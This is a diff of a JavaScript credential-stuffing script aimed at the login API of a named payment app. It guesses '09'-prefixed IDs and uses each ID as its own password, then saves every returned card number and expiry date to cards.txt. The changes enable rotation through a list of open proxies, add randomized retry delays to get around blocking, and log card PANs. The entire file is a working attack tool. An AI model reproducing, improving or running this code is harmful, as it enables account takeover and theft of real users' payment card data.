@@ -2,15 +2,19 @@
 const fs = require("fs")
 var list = [    "103.167.135.112:80","34.196.10.189:9090","51.255.99.186:3128","20.111.54.16:80",    "185.20.198.250:8080",    "140.227.61.156:23456",    "20.210.26.214:3128",    "124.158.186.254:8080",    "5.104.174.199:23500",    "39.107.33.254:8090",    "94.181.48.110:1256",    "198.59.191.234:8080"];
 var proxy = require("https-proxy-agent")
-var mintutes = ["60000","120000","180000"];
+var minutes = ["60000","120000","180000"];
 i = 0;
+
+
 function fish(){
   i++;
 var id = "09"+rand(8);
 //var id = "0125113504"
+var wait = minutes[Math.floor(Math.random() * minutes.length)];
 var pass =id;
 var pro = list[rand(1)]
 Agent = new proxy.HttpsProxyAgent(pro);
+
 var status;
 var info;
 fetch('https://syberapp.sybertechnology.com/api/login', {
@@ -24,7 +28,7 @@ fetch('https://syberapp.sybertechnology.com/api/login', {
       //  'content-length': '233',
         'accept-encoding': 'gzip',
         'user-agent': 'okhttp/4.9.1',
-      // agent:Agent
+  agent:Agent
     },
     body: JSON.stringify({
         'userIdentifier': id,
@@ -53,7 +57,7 @@ fetch('https://syberapp.sybertechnology.com/api/login', {
        // 'content-length': '233',
         'accept-encoding': 'gzip',
         'user-agent': 'okhttp/4.9.1',
-        // agent:Agent
+    agent:Agent
     },
     body: JSON.stringify({
         'userIdentifier': id,
@@ -81,7 +85,7 @@ fetch('https://syberapp.sybertechnology.com/api/login', {
       //  'content-length': '233',
         'accept-encoding': 'gzip',
         'user-agent': 'okhttp/4.9.1',
-       // agent:Agent
+   agent:Agent
     },
     body: JSON.stringify({
         'userIdentifier': id,
@@ -107,7 +111,7 @@ fetch('https://syberapp.sybertechnology.com/api/login', {
       //  'content-length': '233',
         'accept-encoding': 'gzip',
         'user-agent': 'okhttp/4.9.1',
-       // agent:Agent
+   agent:Agent
     },
     body: JSON.stringify({
         'userIdentifier': id,
@@ -130,7 +134,7 @@ fish()
   var cards = data.cards;
   if(cards.length > 0){
 data.cards.forEach((card)=>{
-  console.log(card)
+  console.log(card.pan)
     fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
   }
 fish();
@@ -138,7 +142,7 @@ fish();
     
   }).catch((err)=>{
     console.log("Blocked "+pro+" "+i);i=0;
-setTimeout(()=>{fish()},mintutes[rand(2)])
+setTimeout(()=>{fish()},wait)
   
 })
 
@@ -154,7 +158,7 @@ setTimeout(()=>{fish()},mintutes[rand(2)])
   var cards = data.cards;
   if(cards.length > 0){
 data.cards.forEach((card)=>{
-console.log(card)
+console.log(card.pan)
     fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
   }
 fish();
@@ -162,7 +166,7 @@ fish();
     
   }).catch((err)=>{
     console.log("Blocked "+pro+" "+i);i=0;
-setTimeout(()=>{fish()},mintutes[rand(2)])
+setTimeout(()=>{fish()},wait)
   
 })
 
@@ -174,7 +178,7 @@ setTimeout(()=>{fish()},mintutes[rand(2)])
   var cards = data.cards;
   if(cards.length > 0){
 data.cards.forEach((card)=>{
-console.log(card)
+console.log(card.pan)
     fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
   }
 fish();
@@ -182,7 +186,7 @@ fish();
     
   }).catch((err)=>{
     console.log("Blocked "+pro+" "+i);i=0;
-setTimeout(()=>{fish()},mintutes[rand(2)])
+setTimeout(()=>{fish()},wait)
 
 
 })
@@ -197,14 +201,14 @@ setTimeout(()=>{fish()},mintutes[rand(2)])
   var cards = data.cards;
   if(cards.length > 0){
 data.cards.forEach((card)=>{
-console.log(card)
+console.log(card.pan)
     fs.appendFile("cards.txt",card.pan+"|"+card.expDate+"\n",function (err) {if (err) throw err;});})
   }
 fish();
   }
   }).catch((err)=>{
     console.log("Blocked "+pro+" "+i);i=0;
-  setTimeout(()=>{fish()},mintutes[rand(2)])
+  setTimeout(()=>{fish()},wait)
       
 })
 }
